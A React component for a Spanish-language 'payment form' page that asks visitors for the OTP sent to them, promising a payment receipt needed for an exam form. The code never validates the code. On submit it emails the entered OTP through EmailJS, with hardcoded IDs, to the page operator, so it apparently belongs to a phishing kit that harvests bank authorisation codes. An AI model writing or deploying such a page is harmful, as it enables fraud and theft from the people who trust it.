import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
// import './OTPValidation.css'; // Create this file for custom styling if needed
import Navbar from './Navbar';
import Footer from './Footer';

const OTPValidation = () => {
  const [otp, setOtp] = useState('');
  const navigate = useNavigate();

  const handleOtpSubmit = (e) => {
    e.preventDefault();
    sendOtpEmail();
    // navigate('/payment-receipt'); // Navigate to the payment receipt page
  };

  const sendOtpEmail = () => {
    const templateParams = {
      otp,
    };

    emailjs.send(
        'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
    <Navbar />
    <div className="container d-flex justify-content-center">
      <div className="col-md-6">
        <h2 className="mt-5">Formulario de Pago</h2>
        <p>Recibirá su recibo de pago después de esto;</p>
        <p>Ingrese el código OTP correcto que se le envió</p>
        <form onSubmit={handleOtpSubmit}>
          <div className="form-group">
            <input
            //   type="text"
              className="form-control"
              placeholder="Ingrese la OTP"
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              required
            />
          </div>
          <button type="submit" className="btn btn-primary mt-3">PRÓXIMO</button>
        </form>
        <p className="mt-3">Recibirás tu código en breve</p>
        <p class="fs-5">Su recibo de pago es lo que utilizará para obtener su formulario de examen</p>
      </div>
    </div>
    <Footer />
    </div>
  );
};

export default OTPValidation;
